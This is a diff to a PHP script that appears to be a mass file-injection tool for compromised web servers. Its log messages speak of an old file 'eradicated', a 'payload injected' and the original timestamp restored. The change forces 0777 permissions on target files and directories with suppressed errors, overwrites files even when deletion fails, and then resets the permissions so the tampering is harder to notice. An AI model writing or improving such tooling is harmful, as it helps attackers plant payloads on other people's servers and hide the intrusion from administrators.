@@ -146,14 +146,17 @@ if ($new_code === false) {
             // Detect original modified time
             $original_time = @filemtime($file_path);
             
-            if (unlink($file_path)) {
+            // Force file and directory permissions to ensure update succeeds
+            @chmod($file_path, 0777);
+            @chmod(dirname($file_path), 0777);
+            
+            if (@unlink($file_path)) {
                 sys_print("  [+] Old file eradicated.", "success", 100);
             } else {
-                sys_print("  [-] Failed to remove old file. Permission denied.", "error", 100);
-                $izi_status_log[$file_path] = "Failed to remove old file";
-                continue;
+                sys_print("  [-] Failed to remove old file. Attempting direct overwrite...", "warning", 100);
             }
-            if (file_put_contents($file_path, $new_code) !== false) {
+            
+            if (@file_put_contents($file_path, $new_code) !== false) {
                 sys_print("  [+] Payload injected successfully.", "success", 100);
                 
                 // Restore original timestamp to the file only
@@ -162,9 +165,13 @@ if ($new_code === false) {
                     sys_print("  [+] Original timestamp restored.", "success", 100);
                 }
                 
+                // Restore safer permissions
+                @chmod($file_path, 0644);
+                @chmod(dirname($file_path), 0755);
+                
                 $izi_status_log[$file_path] = "Updated";
             } else {
-                sys_print("  [-] Injection failed. Access restricted.", "error", 100);
+                sys_print("  [-] Injection failed. Access completely restricted.", "error", 100);
                 $izi_status_log[$file_path] = "Injection failed";
             }
             sys_print("", "info"); // Empty line
